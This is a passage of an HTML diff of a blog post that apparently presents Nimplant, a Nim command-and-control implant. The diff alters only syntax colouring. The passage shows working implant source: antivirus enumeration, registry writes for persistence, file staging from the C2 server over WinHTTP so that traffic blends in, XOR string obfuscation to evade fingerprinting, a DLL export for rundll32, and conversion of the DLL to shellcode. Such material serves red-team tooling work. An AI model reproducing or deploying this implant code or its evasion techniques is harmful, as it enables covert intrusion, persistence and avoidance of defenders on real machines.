-        result.add(<span style=color:#a61717;background-color:#e3d2d2>$</span>avprod.displayName &amp; <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>)
-    result = result.strip(trailing = true)
+<span style=color:#75715e># Get antivirus products on the machine via WMI</span>
+proc getAv<span style=color:#f92672>*</span>() : string <span style=color:#f92672>=</span>
+    let wmisec <span style=color:#f92672>=</span> GetObject(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;winmgmts:{impersonationLevel=impersonate}!</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>.\root\securitycenter2&#34;</span>)
+    <span style=color:#66d9ef>for</span> avprod <span style=color:#f92672>in</span> wmisec<span style=color:#f92672>.</span>execQuery(<span style=color:#e6db74>&#34;SELECT displayName FROM AntiVirusProduct</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>):
+        result<span style=color:#f92672>.</span>add(<span style=color:#960050;background-color:#1e0010>$</span>avprod<span style=color:#f92672>.</span>displayName <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+    result <span style=color:#f92672>=</span> result<span style=color:#f92672>.</span>strip(trailing <span style=color:#f92672>=</span> true)
 </code></pre></div><p>Unfortunately, in this instance we have to import the entire <code>winim/com</code> library, since it exports some types that cannot be imported individually (at least, I didn&rsquo;t find out how).</p>
 <p><strong>&lsquo;Reg&rsquo; command</strong></p>
 <p>The <code>reg</code> command is one of the more complex commands that&rsquo;s included in Nimplant. It builds upon Nim&rsquo;s <a href=https://nim-lang.org/docs/registry.html>registry</a> library to perform registry operations. This library is fairly straight-forward, as it only allows us to get or set variables in the <code>HKCU</code> or <code>HKLM</code> registries, which is fine for the purposes of Nimplant. The relative complexity inside this command comes from the fact that one command supports both reading and writing registry values, so the arguments need to be properly parsed to implement this functionality.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>registry</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> join, split, startsWith
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> registry
+<span style=color:#f92672>from</span> strutils <span style=color:#f92672>import</span> join, split, startsWith
 
-<span style=color:#999;font-style:italic># Query or modify the Windows registry</span>
-proc reg*(args : varargs[string]) : string =
+<span style=color:#75715e># Query or modify the Windows registry</span>
+proc reg<span style=color:#f92672>*</span>(args : varargs[string]) : string <span style=color:#f92672>=</span>
 
     var
         command : string
@@ -297,54 +297,54 @@ proc reg*(args : varargs[string]) : string =
         value : string
         handleStr : string
         regPath : string
-        handle : registry.HKEY
+        handle : registry<span style=color:#f92672>.</span>HKEY
 
-    <span style=color:#999;font-style:italic># Parse arguments</span>
-    case args.len:
-        of <span style=color:#3677a9>2</span>:
-            command = args[<span style=color:#3677a9>0</span>]
-            path = args[<span style=color:#3677a9>1</span>]
-        of <span style=color:#3677a9>3</span>:
-            command = args[<span style=color:#3677a9>0</span>]
-            path = args[<span style=color:#3677a9>1</span>]
-            key = args[<span style=color:#3677a9>2</span>]
-        of <span style=color:#3677a9>4</span>:
-            command = args[<span style=color:#3677a9>0</span>]
-            path = args[<span style=color:#3677a9>1</span>]
-            key = args[<span style=color:#3677a9>2</span>]
-            value = args[<span style=color:#3677a9>3</span> .. ^<span style=color:#3677a9>1</span>].join(<span style=color:#ed9d13>&#34; &#34;</span>)
-        <span style=color:#6ab825;font-weight:700>else</span>:
-            result = <span style=color:#ed9d13>&#34;Invalid number of arguments received. Usage: &#39;reg [query|add] [path] &lt;optional: key&gt; &lt;optional: value&gt;&#39;.&#34;</span>
-            <span style=color:#6ab825;font-weight:700>return</span>
+    <span style=color:#75715e># Parse arguments</span>
+    case args<span style=color:#f92672>.</span>len:
+        of <span style=color:#ae81ff>2</span>:
+            command <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>0</span>]
+            path <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>1</span>]
+        of <span style=color:#ae81ff>3</span>:
+            command <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>0</span>]
+            path <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>1</span>]
+            key <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>2</span>]
+        of <span style=color:#ae81ff>4</span>:
+            command <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>0</span>]
+            path <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>1</span>]
+            key <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>2</span>]
+            value <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>3</span> <span style=color:#f92672>..</span> <span style=color:#f92672>^</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>join(<span style=color:#e6db74>&#34; &#34;</span>)
+        <span style=color:#66d9ef>else</span>:
+            result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Invalid number of arguments received. Usage: &#39;reg [query|add] [path] &lt;optional: key&gt; &lt;optional: value&gt;&#39;.&#34;</span>
+            <span style=color:#66d9ef>return</span>
 
-    <span style=color:#999;font-style:italic># Parse the registry path</span>
-    <span style=color:#6ab825;font-weight:700>try</span>:
-        handleStr = path.split(<span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>&#34;</span>)[<span style=color:#3677a9>0</span>]
-        regPath = path.split(<span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>&#34;</span>, <span style=color:#3677a9>1</span>)[<span style=color:#3677a9>1</span>]
-    <span style=color:#6ab825;font-weight:700>except</span>:
-        result = <span style=color:#ed9d13>&#34;Unable to parse registry path. Please use format: &#39;HKCU</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Software</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Microsoft</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Windows</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>CurrentVersion</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Run&#39;.&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
+    <span style=color:#75715e># Parse the registry path</span>
+    <span style=color:#66d9ef>try</span>:
+        handleStr <span style=color:#f92672>=</span> path<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>)[<span style=color:#ae81ff>0</span>]
+        regPath <span style=color:#f92672>=</span> path<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>1</span>)[<span style=color:#ae81ff>1</span>]
+    <span style=color:#66d9ef>except</span>:
+        result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Unable to parse registry path. Please use format: &#39;HKCU</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Software</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Microsoft</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>CurrentVersion</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Run&#39;.&#34;</span>
+        <span style=color:#66d9ef>return</span>
 
-    <span style=color:#999;font-style:italic># Identify the correct hive from the parsed path</span>
-    <span style=color:#6ab825;font-weight:700>if</span> handleStr.startsWith(<span style=color:#ed9d13>&#34;HKCu&#34;</span>):
-        handle = registry.HKEY_CURRENT_USER
-    <span style=color:#6ab825;font-weight:700>elif</span> handleStr.startsWith(<span style=color:#ed9d13>&#34;HKLM&#34;</span>):
-        handle = registry.HKEY_LOCAL_MACHINE
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        result = <span style=color:#ed9d13>&#34;Invalid registry. Only &#39;HKCU&#39; and &#39;HKLM&#39; are supported at this time.&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
+    <span style=color:#75715e># Identify the correct hive from the parsed path</span>
+    <span style=color:#66d9ef>if</span> handleStr<span style=color:#f92672>.</span>startsWith(<span style=color:#e6db74>&#34;HKCu&#34;</span>):
+        handle <span style=color:#f92672>=</span> registry<span style=color:#f92672>.</span>HKEY_CURRENT_USER
+    <span style=color:#66d9ef>elif</span> handleStr<span style=color:#f92672>.</span>startsWith(<span style=color:#e6db74>&#34;HKLM&#34;</span>):
+        handle <span style=color:#f92672>=</span> registry<span style=color:#f92672>.</span>HKEY_LOCAL_MACHINE
+    <span style=color:#66d9ef>else</span>:
+        result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Invalid registry. Only &#39;HKCU&#39; and &#39;HKLM&#39; are supported at this time.&#34;</span>
+        <span style=color:#66d9ef>return</span>
 
-    <span style=color:#999;font-style:italic># Query an existing registry value</span>
-    <span style=color:#6ab825;font-weight:700>if</span> command == <span style=color:#ed9d13>&#34;query&#34;</span>:
-        result = getUnicodeValue(regPath, key, handle)
+    <span style=color:#75715e># Query an existing registry value</span>
+    <span style=color:#66d9ef>if</span> command <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;query&#34;</span>:
+        result <span style=color:#f92672>=</span> getUnicodeValue(regPath, key, handle)
 
-    <span style=color:#999;font-style:italic># Add a value to the registry</span>
-    <span style=color:#6ab825;font-weight:700>elif</span> command == <span style=color:#ed9d13>&#34;add&#34;</span>:
+    <span style=color:#75715e># Add a value to the registry</span>
+    <span style=color:#66d9ef>elif</span> command <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;add&#34;</span>:
         setUnicodeValue(regPath, key, value, handle)
-        result = <span style=color:#ed9d13>&#34;Successfully set registry value.&#34;</span>
+        result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Successfully set registry value.&#34;</span>
 
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        result = <span style=color:#ed9d13>&#34;Unknown reg command. Please use &#39;reg query&#39; or &#39;reg add&#39; followed by the path (and value when adding a key).&#34;</span>
+    <span style=color:#66d9ef>else</span>:
+        result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Unknown reg command. Please use &#39;reg query&#39; or &#39;reg add&#39; followed by the path (and value when adding a key).&#34;</span>
 </code></pre></div><p>Example usage of this command for &ldquo;persistence&rdquo; (<code>calc.exe</code> ftw) is shown below.</p>
 <p><img src=/images/nimplant-registry.png alt="Nimplant &lsquo;reg&rsquo; command"></p>
 <p><strong>&lsquo;Upload&rsquo; command</strong></p>
@@ -352,14 +352,14 @@ proc reg*(args : varargs[string]) : string =
 <p>Because compiling the native web library with SSL support is wholly broken in Nim, I resorted to using the excellent <a href=https://github.com/treeform/puppy>Puppy</a> library for all web interactions, including C2 traffic and web-based commands like <code>curl</code> or <code>wget</code>. This library which uses the <code>WinHTTP</code> API under the hood, so it should blend in quite well. It also supports transparent Gzip deflation, which is utilized to compress the file in-transit.</p>
 <p>The command is executed in two phases. First, when the <code>upload</code> command is received by the C2 server, it parses the file to upload, GZip-compresses it, and makes it available for download after providing it with a unique ID. This ID is then passed on to the implant along with the <code>upload</code> command, allowing it to find and download the file. Because WinHTTP is used for the transfer, it looks like a regular file download from a networking perspective.</p>
 <p>Because of this, the Nim code is relatively straight-forward. The bulk of it is again parsing parameters and determining the destination on disk, this time with the addition of parsing some settings from the listener configuration.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>puppy</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> join, split
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>os</span> <span style=color:#6ab825;font-weight:700>import</span> getcurrentdir, <span style=color:#a61717;background-color:#e3d2d2>`</span>/<span style=color:#a61717;background-color:#e3d2d2>`</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>..</span>/util/webClient <span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>Listener</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> puppy
+<span style=color:#f92672>from</span> strutils <span style=color:#f92672>import</span> join, split
+<span style=color:#f92672>from</span> os <span style=color:#f92672>import</span> getcurrentdir, <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>`</span>
+<span style=color:#f92672>from</span> ..<span style=color:#f92672>/</span>util<span style=color:#f92672>/</span>webClient <span style=color:#f92672>import</span> Listener
 
-<span style=color:#999;font-style:italic># Upload a file from the C2 server to Nimplant</span>
-<span style=color:#999;font-style:italic># From Nimplant&#39;s perspective this is similar to wget, but calling to the C2 server instead</span>
-proc upload*(li : Listener, args : varargs[string]) : string =
+<span style=color:#75715e># Upload a file from the C2 server to Nimplant</span>
+<span style=color:#75715e># From Nimplant&#39;s perspective this is similar to wget, but calling to the C2 server instead</span>
+proc upload<span style=color:#f92672>*</span>(li : Listener, args : varargs[string]) : string <span style=color:#f92672>=</span>
     var 
         fileId : string
         fileName : string
@@ -367,91 +367,91 @@ proc upload*(li : Listener, args : varargs[string]) : string =
         url : string
         res : string
 
-		<span style=color:#999;font-style:italic># The command is passed as &#39;upload [localfile] &lt;remotedestination&gt;&#39;</span>
-		<span style=color:#999;font-style:italic># It is however transmitted as &#39;upload [file-identifier] [originalfilename] &lt;remotedestination&gt;&#39;</span>
-    <span style=color:#6ab825;font-weight:700>if</span> args.len == <span style=color:#3677a9>2</span> <span style=color:#6ab825;font-weight:700>and</span> args[<span style=color:#3677a9>0</span>] != <span style=color:#ed9d13>&#34;&#34;</span> <span style=color:#6ab825;font-weight:700>and</span> args[<span style=color:#3677a9>1</span>] != <span style=color:#ed9d13>&#34;&#34;</span>:
-        fileId = args[<span style=color:#3677a9>0</span>]
-        fileName = args[<span style=color:#3677a9>1</span>]
-        filePath = getCurrentDir()/fileName
-    <span style=color:#6ab825;font-weight:700>elif</span> args.len &gt;= <span style=color:#3677a9>3</span>:
-        fileId = args[<span style=color:#3677a9>0</span>]
-        fileName = args[<span style=color:#3677a9>1</span>]
-        filePath = args[<span style=color:#3677a9>2</span> .. ^<span style=color:#3677a9>1</span>].join(<span style=color:#ed9d13>&#34; &#34;</span>)
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        <span style=color:#999;font-style:italic># Handling of the second argument (filename) is done by the python server</span>
-        result = <span style=color:#ed9d13>&#34;Invalid number of arguments received. Usage: &#39;upload [local file] [optional: remote file]&#39;.&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
+		<span style=color:#75715e># The command is passed as &#39;upload [localfile] &lt;remotedestination&gt;&#39;</span>
+		<span style=color:#75715e># It is however transmitted as &#39;upload [file-identifier] [originalfilename] &lt;remotedestination&gt;&#39;</span>
+    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>len <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>and</span> args[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span> <span style=color:#f92672>and</span> args[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>:
+        fileId <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>0</span>]
+        fileName <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>1</span>]
+        filePath <span style=color:#f92672>=</span> getCurrentDir()<span style=color:#f92672>/</span>fileName
+    <span style=color:#66d9ef>elif</span> args<span style=color:#f92672>.</span>len <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>3</span>:
+        fileId <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>0</span>]
+        fileName <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>1</span>]
+        filePath <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>2</span> <span style=color:#f92672>..</span> <span style=color:#f92672>^</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>join(<span style=color:#e6db74>&#34; &#34;</span>)
+    <span style=color:#66d9ef>else</span>:
+        <span style=color:#75715e># Handling of the second argument (filename) is done by the python server</span>
+        result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Invalid number of arguments received. Usage: &#39;upload [local file] [optional: remote file]&#39;.&#34;</span>
+        <span style=color:#66d9ef>return</span>
     
-		<span style=color:#999;font-style:italic># Parse the staging server from the configuration file</span>
-    url = li.listenerType &amp; <span style=color:#ed9d13>&#34;://&#34;</span>
-    <span style=color:#6ab825;font-weight:700>if</span> li.listenerHost != <span style=color:#ed9d13>&#34;&#34;</span>:
-        url = url &amp; li.listenerHost
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        url = url &amp; li.listenerIp &amp; <span style=color:#ed9d13>&#34;:&#34;</span> &amp; li.listenerPort
-    url = url &amp; li.taskpath &amp; <span style=color:#ed9d13>&#34;/&#34;</span> &amp; fileId &amp; <span style=color:#ed9d13>&#34;?id=&#34;</span> &amp; li.id
+		<span style=color:#75715e># Parse the staging server from the configuration file</span>
+    url <span style=color:#f92672>=</span> li<span style=color:#f92672>.</span>listenerType <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;://&#34;</span>
+    <span style=color:#66d9ef>if</span> li<span style=color:#f92672>.</span>listenerHost <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>:
+        url <span style=color:#f92672>=</span> url <span style=color:#f92672>&amp;</span> li<span style=color:#f92672>.</span>listenerHost
+    <span style=color:#66d9ef>else</span>:
+        url <span style=color:#f92672>=</span> url <span style=color:#f92672>&amp;</span> li<span style=color:#f92672>.</span>listenerIp <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;:&#34;</span> <span style=color:#f92672>&amp;</span> li<span style=color:#f92672>.</span>listenerPort
+    url <span style=color:#f92672>=</span> url <span style=color:#f92672>&amp;</span> li<span style=color:#f92672>.</span>taskpath <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;/&#34;</span> <span style=color:#f92672>&amp;</span> fileId <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;?id=&#34;</span> <span style=color:#f92672>&amp;</span> li<span style=color:#f92672>.</span>id
 
-    <span style=color:#999;font-style:italic># Download the file - Puppy will take care of transparent gzip deflation</span>
-    res = fetch(
+    <span style=color:#75715e># Download the file - Puppy will take care of transparent gzip deflation</span>
+    res <span style=color:#f92672>=</span> fetch(
             url,
-            headers = @[Header(key: <span style=color:#ed9d13>&#34;User-Agent&#34;</span>, value: li.userAgent)]
+            headers <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>[Header(key: <span style=color:#e6db74>&#34;User-Agent&#34;</span>, value: li<span style=color:#f92672>.</span>userAgent)]
             )
     
-    <span style=color:#6ab825;font-weight:700>if</span> res == <span style=color:#ed9d13>&#34;&#34;</span>:
-        result = <span style=color:#ed9d13>&#34;Something went wrong uploading the file (Nimplant did not receive response from staging server &#39;&#34;</span> &amp; url &amp; <span style=color:#ed9d13>&#34;&#39;).&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        filePath.writeFile(res)
-        result = <span style=color:#ed9d13>&#34;Uploaded file to &#39;&#34;</span> &amp; filePath &amp; <span style=color:#ed9d13>&#34;&#39;.&#34;</span>
+    <span style=color:#66d9ef>if</span> res <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span>:
+        result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Something went wrong uploading the file (Nimplant did not receive response from staging server &#39;&#34;</span> <span style=color:#f92672>&amp;</span> url <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;&#39;).&#34;</span>
+        <span style=color:#66d9ef>return</span>
+    <span style=color:#66d9ef>else</span>:
+        filePath<span style=color:#f92672>.</span>writeFile(res)
+        result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Uploaded file to &#39;&#34;</span> <span style=color:#f92672>&amp;</span> filePath <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;&#39;.&#34;</span>
 </code></pre></div><p><strong>Defense Evasion</strong></p>
 <p>As mentioned earlier on in this post, the idea behind Nimplant is to minimize malicious functionality. This includes defense evasion tricks that, when spotted by a defender, reveal the true nature of Nimplant. I did however choose to include a variant of <a href=https://github.com/Yardanico/nim-strenc>nim-strenc</a>, a library that implements a macro that XOR-encodes static strings at compile time. I&rsquo;d recommend to take a look at the code, it&rsquo;s a pretty good example of how powerful compile-time macro&rsquo;s can be in Nim.</p>
 <p>Though this results in a collection of strings that may look suspicious on manual inspection, it has several advantages. First, it hides semi-sensitive string values from prying eyes, unless an analyst is brave enough to open up a debugger. Additionally, the random seeds for XOR-encoding ensure that the fingerprint of Nimplant is different every time it is compiled, even if the same configuration is used. This helps prevent static fingerprinting of the binary by e.g. the MD5 hash of the file. Finally, using XOR does not affect the entropy value of the binary - an important measure for determining if encrypted and potentially malicious content is present in a binary. Overall, this results in a net benefit for Nimplant where some degree of obfuscation is achieved while limiting the amount of suspicious indicators.</p>
 <h3 id=the-wrapper>The Wrapper</h3>
 <p>The last component of Nimplant is a wrapper script that helps users with compiling the appropriate binaries (after correctly configuring the shared <code>config.toml</code> file), and setting up the C2 server. It supports a variety of compilation options, including <code>.exe</code>, <code>.dll</code>, and <code>.bin</code>. The first two are supported natively by Nim, and are implemented through a compile-time flag in the main Nim function, as follows.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>when defined exportDll:
-		<span style=color:#999;font-style:italic># Manually define the NimMain() function for garbage collection (thanks OffensiveNim)</span>
-    proc NimMain() {.cdecl, importc.}
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>when defined exportDll:
+		<span style=color:#75715e># Manually define the NimMain() function for garbage collection (thanks OffensiveNim)</span>
+    proc NimMain() {<span style=color:#f92672>.</span>cdecl, importc<span style=color:#f92672>.</span>}
 
-		<span style=color:#999;font-style:italic># Define an exported function that can be used to trigger the DLL</span>
-		<span style=color:#999;font-style:italic># In this example, one would run &#39;rundll32 .\file.dll,Connect&#39; to execute</span>
-    proc Connect(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : <span style=color:#24909d>bool</span> {.stdcall, exportc, dynlib.} =
+		<span style=color:#75715e># Define an exported function that can be used to trigger the DLL</span>
+		<span style=color:#75715e># In this example, one would run &#39;rundll32 .\file.dll,Connect&#39; to execute</span>
+    proc Connect(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {<span style=color:#f92672>.</span>stdcall, exportc, dynlib<span style=color:#f92672>.</span>} <span style=color:#f92672>=</span>
         NimMain()
         runNp()
-        <span style=color:#6ab825;font-weight:700>return</span> true
+        <span style=color:#66d9ef>return</span> true
 
-<span style=color:#6ab825;font-weight:700>else</span>:
-		<span style=color:#999;font-style:italic># Structure the binary as a regular executable</span>
+<span style=color:#66d9ef>else</span>:
+		<span style=color:#75715e># Structure the binary as a regular executable</span>
     when isMainModule:
         runNp()
 </code></pre></div><p>The compilation helper function basically just constructs the Nim compilation command, accounting for any compile-time and cross-compilation flags that may be needed. If position-independent shellcode is requested as an output format (useful when using other shellcode packers, like Nimpackt 😏), the <code>ConvertToShellcode</code> function from the excellent <a href=https://github.com/monoxgas/sRDI/blob/master/Python/ShellcodeRDI.py>ShellcodeRDI.py</a> is used to convert a freshly generated Nim DLL file to shellcode. Though this is a pretty well-documented technique by now that brings some obvious OPSEC risks, it seems to work quite well in the situations that it&rsquo;s needed. The compilation helper function looks like this.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>def compileNim(<span style=color:#24909d>type</span>):
-    <span style=color:#6ab825;font-weight:700>if</span> (<span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;exe&#34;</span> or <span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;dll&#34;</span>):
-				<span style=color:#999;font-style:italic># Define base compilation command</span>
-        <span style=color:#40ffff>compileCommand</span> = <span style=color:#ed9d13>&#34;nim c --hints:off --warnings:off -d:release -d:strip --opt:size --passc=-flto --passl=-flto --app:gui -o:client/bin/&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>def compileNim<span style=color:#f92672>(</span>type<span style=color:#f92672>)</span>:
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>type <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;exe&#34;</span> or type <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;dll&#34;</span><span style=color:#f92672>)</span>:
+				<span style=color:#75715e># Define base compilation command</span>
+        compileCommand <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;nim c --hints:off --warnings:off -d:release -d:strip --opt:size --passc=-flto --passl=-flto --app:gui -o:client/bin/&#34;</span>
 
-        <span style=color:#6ab825;font-weight:700>if</span> <span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;dll&#34;</span>:
-						<span style=color:#999;font-style:italic># Add flags for DLL compilation</span>
-						<span style=color:#999;font-style:italic># The &#39;-d:exportDll&#39; flag triggers the &#39;when defined&#39; statements shown above</span>
-            <span style=color:#40ffff>compileCommand</span> = compileCommand + <span style=color:#ed9d13>&#34; --app=lib --nomain -d:exportDll&#34;</span>
+        <span style=color:#66d9ef>if</span> type <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;dll&#34;</span>:
+						<span style=color:#75715e># Add flags for DLL compilation</span>
+						<span style=color:#75715e># The &#39;-d:exportDll&#39; flag triggers the &#39;when defined&#39; statements shown above</span>
+            compileCommand <span style=color:#f92672>=</span> compileCommand + <span style=color:#e6db74>&#34; --app=lib --nomain -d:exportDll&#34;</span>
 
-        <span style=color:#6ab825;font-weight:700>if</span> os.name != <span style=color:#ed9d13>&#34;nt&#34;</span>:
-						<span style=color:#999;font-style:italic># Use cross-compilation from Linux using MinGW</span>
-            <span style=color:#40ffff>compileCommand</span> = compileCommand + <span style=color:#ed9d13>&#34; -d=mingw&#34;</span>
+        <span style=color:#66d9ef>if</span> os.name !<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;nt&#34;</span>:
+						<span style=color:#75715e># Use cross-compilation from Linux using MinGW</span>
+            compileCommand <span style=color:#f92672>=</span> compileCommand + <span style=color:#e6db74>&#34; -d=mingw&#34;</span>
 
-        <span style=color:#40ffff>compileCommand</span> = compileCommand + <span style=color:#ed9d13>&#34; client/NimPlant.nim&#34;</span>
-        os.system(compileCommand)
+        compileCommand <span style=color:#f92672>=</span> compileCommand + <span style=color:#e6db74>&#34; client/NimPlant.nim&#34;</span>
+        os.system<span style=color:#f92672>(</span>compileCommand<span style=color:#f92672>)</span>
 
-    <span style=color:#6ab825;font-weight:700>elif</span> (<span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;raw&#34;</span>):
-				<span style=color:#999;font-style:italic># Generate PIC from Nim DLL using sRDI</span>
-        <span style=color:#6ab825;font-weight:700>if</span> not os.path.isfile(<span style=color:#ed9d13>&#34;client/bin/NimPlant.dll&#34;</span>):
-            compileNim(<span style=color:#ed9d13>&#34;dll&#34;</span>)
+    <span style=color:#66d9ef>elif</span> <span style=color:#f92672>(</span>type <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;raw&#34;</span><span style=color:#f92672>)</span>:
+				<span style=color:#75715e># Generate PIC from Nim DLL using sRDI</span>
+        <span style=color:#66d9ef>if</span> not os.path.isfile<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;client/bin/NimPlant.dll&#34;</span><span style=color:#f92672>)</span>:
+            compileNim<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;dll&#34;</span><span style=color:#f92672>)</span>
 
-        <span style=color:#40ffff>dll</span> = open(<span style=color:#ed9d13>&#34;client/bin/NimPlant.dll&#34;</span>, <span style=color:#ed9d13>&#34;rb&#34;</span>).read()
-        <span style=color:#40ffff>shellcode</span> = ConvertToShellcode(dll, HashFunctionName(<span style=color:#ed9d13>&#39;Update&#39;</span>), <span style=color:#40ffff>flags</span>=0x5)
-        with open(<span style=color:#ed9d13>&#34;client/bin/NimPlant.bin&#34;</span>, <span style=color:#ed9d13>&#34;wb&#34;</span>) as f:
-            f.write(shellcode)
+        dll <span style=color:#f92672>=</span> open<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;client/bin/NimPlant.dll&#34;</span>, <span style=color:#e6db74>&#34;rb&#34;</span><span style=color:#f92672>)</span>.read<span style=color:#f92672>()</span>
